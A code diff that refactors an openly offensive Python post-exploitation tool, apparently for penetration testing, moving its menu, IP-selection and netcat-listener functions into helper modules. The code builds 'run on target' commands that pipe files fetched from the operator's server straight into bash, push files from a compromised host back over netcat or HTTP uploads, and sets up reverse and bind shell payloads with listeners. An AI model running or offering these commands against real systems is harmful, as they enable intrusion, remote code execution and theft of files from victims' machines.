@@ -7,10 +7,14 @@ import subprocess
 import random
 import hashlib
 import string
-import netifaces as ni
 import time
 import urllib.request
 from getpass import getpass
+
+import uploadfrom
+import uploadto
+import helpers
+import services
 
 # UPLOAD TO WINDOW TARGET METHODS
 UploadTo_WinMethods = [
@@ -87,58 +91,6 @@ Fileless_Types = [
     'Python (.py)'
 ]
 
-# PASTABLES OUTPUT TEMPLATE
-def pastables(cmd):
-    print('\n[================== RUN ON TARGET ==================]\n')
-    print(cmd)
-    print('\n[================ END RUN ON TARGET ================]\n')
-
-# GENERATE CHOICES BASED ON A DYNAMIC LIST
-def dynamic_populated_choices(entrymsg, dynamic_list):
-    while True:
-        print(entrymsg)
-        i = 1
-        temp_list = []
-        for item in dynamic_list:
-            print('      ' + str(i) + ') ' + item)
-            i += 1
-        print('[?] CHOICE: ', end='')
-        try:
-            choice = input()
-        except KeyboardInterrupt:
-            sys.exit(0)
-        if int(choice) <= len(dynamic_list):
-            choice = dynamic_list[int(choice)-1]
-            return choice
-        else:
-            print('[!] Invalid choice. Try again.')
-
-# SELECT IP ADDRESS TO LISTEN TO
-def listening_ip_address():
-    # SELECT IP ADDRESS TO LISTEN TO
-    ip_list = []
-    for interface in ni.interfaces():
-        ipv4 = ni.ifaddresses(interface)
-        if ni.AF_INET in ipv4.keys():
-            ip_list.append(ipv4[ni.AF_INET][0]['addr'])
-    while True:
-        print('[?] What IP address to listen on? ')
-        i = 1
-        for ip in ip_list:
-            print('      ' + str(i) + ') ' + ip)
-            i += 1
-        print('[?] CHOICE: ', end='')
-        try:
-            choice = input()
-            if choice == '':
-                choice = '999'
-        except KeyboardInterrupt:
-            sys.exit(0)
-        if int(choice) <= len(ip_list):
-            return ip_list[int(choice)-1]
-        else:
-            print('Invalid choice. Try again.')
-    
 # GET ABSOLUTE PATH OF FILE ON TARGET
 def get_absolute_path():
     print('[?] What is the absolute path of the file on target: ', end='')
@@ -215,7 +167,7 @@ def run_command(args):
 def download_file(args):
     # SELECT DOWNLOAD METHOD
     entrymsg = '[?] Which download method to use:'
-    choice = dynamic_populated_choices(entrymsg, Download_Methods)
+    choice = helpers.populateChoices(entrymsg, Download_Methods)
     if choice == 'Python 3':
         try:
             urllib.request.urlretrieve(args.url, args.url.split('/')[-1])
@@ -230,7 +182,7 @@ def download_file(args):
         elif choice == 'Python 2.7':
             cmd = 'python2.7 -c \'import urllib;urllib.urlretrieve (' + args.url + ', ' + args.url.split('/')[-1] + ')\''
         elif choice == 'PHP':
-            choice = dynamic_populated_choices(entrymsg, PHP_Download_Methods)
+            choice = helpers.populateChoices(entrymsg, PHP_Download_Methods)
             if choice == 'File_Get_Contents()':
                 cmd = 'php -r \'\$file = file_get_contents(\"' + args.url + '\"); file_put_contents(\"' + args.url.split('/')[-1] + '\",\$file);\''
             elif choice == 'Fopen()':
@@ -281,7 +233,7 @@ def create_payload(args):
         print('[?] Target IP: ', end='')
         listen_ip = input()
     else:
-        listen_ip = listening_ip_address()
+        listen_ip = helpers.whichIP()
     print('[?] Listening Port [default=random]: ', end='')
     try:
         listen_port = input()
@@ -311,12 +263,7 @@ def create_payload(args):
 
         # START LISTENER
         if run_listener == '' or run_listener[0] == 'y':
-            try:
-                print('[+] Listening on ' + listen_ip + ':' + listen_port + ' ...')
-                cmd = 'nc -nls ' + listen_ip + ' -p ' + listen_port
-                subprocess.run(cmd)
-            except KeyboardInterrupt:
-                sys.exit(0)
+            services.startListener(listen_ip, listen_port)
         else:
             print('[-] No listener was started')
     elif args.shell == 'bind':
@@ -341,20 +288,20 @@ def upload_to(args):
     #########################
     if args.os == 'windows':
         # METHOD SELECTION
-        method = dynamic_populated_choices(entrymsg, UploadTo_WinMethods)
+        method = helpers.populateChoices(entrymsg, UploadTo_WinMethods)
 
         ###########################
         ### WINDOWS HTTP METHOD ###
         ###########################
         if method == 'HTTP':
-            listen_ip = listening_ip_address()
+            listen_ip = helpers.whichIP()
             listen_port = '443'
 
             start_http_server(listen_ip, listen_port, relpath)
             
             # PASTABLES
             entrymsg = '[+] Select windows target download method:'
-            choice = dynamic_populated_choices(entrymsg, PSTo_Methods)
+            choice = helpers.populateChoices(entrymsg, PSTo_Methods)
             if choice == 'DownloadFile':
                 print('[+] DownloadFile method selected')
                 print('[?] Sync or Async [default=sync]: ', end='')
@@ -420,7 +367,7 @@ def upload_to(args):
             else:
                 print('[!] Invalid choice')
             cmd = startcmd + endcmd
-            pastables(cmd)
+            helpers.pasta(cmd)
 
             terminate_http_server()
 
@@ -475,7 +422,7 @@ def upload_to(args):
             target_ip = input()
             rand_port = str(random.randint(49152, 65535))
             cmd = 'nc.exe -l -p ' + rand_port + ' > ' + args.filename
-            pastables(cmd)
+            helpers.pasta(cmd)
             input('[?] Press any key once command is ran on target ...')
             cmd = 'nc ' + target_ip + ' ' + rand_port + ' < ' + relpath
             proc = subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
@@ -489,7 +436,7 @@ def upload_to(args):
     #######################
     elif args.os == 'linux':
         # METHOD SELECTION
-        method = dynamic_populated_choices(entrymsg, UploadTo_NixMethods)
+        method = helpers.populateChoices(entrymsg, UploadTo_NixMethods)
 
         ###########################
         ### LINUX BASE64 METHOD ###
@@ -513,7 +460,7 @@ def upload_to(args):
             elif method == 'Base64 - Fileless':
                 cmd = '# EXECUTE ' + args.filename.upper() + ' ON TARGET\n'
                 cmd += 'echo -n \'' + b64 + ' | base64 -d | bash'
-            pastables(cmd)
+            helpers.pasta(cmd)
 
             verify_hash(relpath)
         
@@ -521,18 +468,18 @@ def upload_to(args):
         ### LINUX HTTP METHOD ###
         #########################
         elif method == 'HTTP' or method == 'HTTP - Fileless':
-            listen_ip = listening_ip_address()
+            listen_ip = helpers.whichIP()
             listen_port = '443'
 
             entrymsg = '[+] Select windows target download method:'
-            choice = dynamic_populated_choices(entrymsg, Download_Methods)
+            choice = helpers.populateChoices(entrymsg, Download_Methods)
             if choice == 'cURL':
                 if method == 'HTTP':
                     cmd = '# CREATE ' + args.filename.upper() + ' ON TARGET\n'
                     cmd += 'curl http://' + listen_ip + ':' + listen_port + '/' + args.filename + ' -o ' + args.filename
                 elif method == 'HTTP - Fileless':
                     entrymsg = '[+] Select file type being uploaded:'
-                    choice = dynamic_populated_choices(entrymsg, Fileless_Types)
+                    choice = helpers.populateChoices(entrymsg, Fileless_Types)
                     cmd = '# EXECUTE ' + args.filename.upper() + ' ON TARGET\n'
                     if choice == 'BASH script (.sh)':
                         cmd += 'curl http://' + listen_ip + ':' + listen_port + '/' + args.filename + ' | bash'
@@ -544,7 +491,7 @@ def upload_to(args):
                     cmd += 'wget http://' + listen_ip + ':' + listen_port + '/' + args.filename
                 elif method == 'HTTP - Fileless':
                     entrymsg = '[+] Select file type being uploaded:'
-                    choice = dynamic_populated_choices(entrymsg, Fileless_Types)
+                    choice = helpers.populateChoices(entrymsg, Fileless_Types)
                     cmd = '# EXECUTE ' + args.filename.upper() + ' ON TARGET\n'
                     if choice == 'BASH script (.sh)':
                         cmd += 'wget -qO- http://' + listen_ip + ':' + listen_port + '/' + args.filename + ' | bash'
@@ -591,7 +538,7 @@ def upload_from(args):
     ###########################
     if args.os == 'windows':
         # METHOD SELECTION
-        method = dynamic_populated_choices(entrymsg, UploadFrom_WinMethods)
+        method = helpers.populateChoices(entrymsg, UploadFrom_WinMethods)
 
         #############################
         ### WINDOWS BASE64 METHOD ###
@@ -604,7 +551,7 @@ def upload_from(args):
                 cmd += '[Convert]::ToBase64String((Get-Content -path \"' + file_absolute_path + '\" -Encoding byte))\n'
                 cmd += '\n# GENERATE MD5 CHECKSUM\n'
                 cmd += 'Get-FileHash ' + file_absolute_path + ' -Algorithm md5'
-                pastables(cmd)
+                helpers.pasta(cmd)
                 print('[?] Paste generated Base64 string here: ', end='')
                 try:
                     b64 = input()
@@ -636,7 +583,7 @@ def upload_from(args):
         ###################################
         elif method == 'UploadServer':
             # START UPLOADSERVER
-            listen_ip = listening_ip_address()
+            listen_ip = helpers.whichIP()
             print('[+] Starting upload server on ' + listen_ip + ':443 ...')
             try:
                 uploadserver = subprocess.Popen(['python3', '-m', 'uploadserver', '-b', listen_ip, '443'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
@@ -653,7 +600,7 @@ def upload_from(args):
 
             # SELECT WHICH POWERSHELL UPLOAD METHOD
             entrymsg = '[?] Which PowerShell upload method to use on target: '
-            choice = dynamic_populated_choices(entrymsg, PSFrom_Methods)
+            choice = helpers.populateChoices(entrymsg, PSFrom_Methods)
 
             # GENERATE TARGET PASTABLES
             if choice == 'PSUpload.ps1':
@@ -670,7 +617,7 @@ def upload_from(args):
                 cmd = 'python3 -c \'import requests;requests.post("http://' + listen_ip + ':443/upload",files={"files":open("' + file_absolute_path + '","rb")})\''
             elif choice == 'Python 2.7':
                 cmd = 'python2.7 -c \'import urllib;urllib.urlretrieve ("http://' + listen_ip + ':443/upload",' + args.url.split('/')[-1] + ')\''
-            pastables(cmd)
+            helpers.pasta(cmd)
 
             # TERMINATE UPLOAD SERVER WHEN DONE
             print('[?] Close upload server? [Y/n] ', end='')
@@ -691,7 +638,7 @@ def upload_from(args):
         ### WINDOWS NETCAT METHOD ###
         #############################
         elif method == 'Netcat':
-            listen_ip = listening_ip_address()
+            listen_ip = helpers.whichIP()
             cmd = 'nc -l -p 443 > ' + args.filename
             try:
                 try:
@@ -700,7 +647,7 @@ def upload_from(args):
                 except:
                     print('[!] Failed to start Netcat listener')
                 cmd = 'nc.exe ' + listen_ip + ' 443 < ' + relpath
-                pastables(cmd)
+                helpers.pasta(cmd)
                 print('[?] Press Ctrl+C to cancel transfer ...')
                 proc.wait()
             except KeyboardInterrupt:
@@ -712,7 +659,7 @@ def upload_from(args):
     ### FROM LINUX TARGET ###
     #########################
     elif args.os == 'linux':
-        method = dynamic_populated_choices(entrymsg, UploadFrom_NixMethods)
+        method = helpers.populateChoices(entrymsg, UploadFrom_NixMethods)
 
         #     print('[-] Still working on it')
             # b64_file = subprocess.run(['base64', '-w', '0', relpath], capture_output=True, text=True)
@@ -720,6 +667,7 @@ def upload_from(args):
             # print('echo \'' + b64_file.stdout + '\' | base64 -d > ' + args.filename + ' && md5sum ' + args.filename)
             # print('\n[====== END LINUX COMMAND ======]\n')
 
+# ENCRYPT FILES WITH SSL
 def encrypt_file(args):
     # SEPARATE RELATIVE PATH TO FILE FROM FILENAME ITSELF
     relpath = args.filename
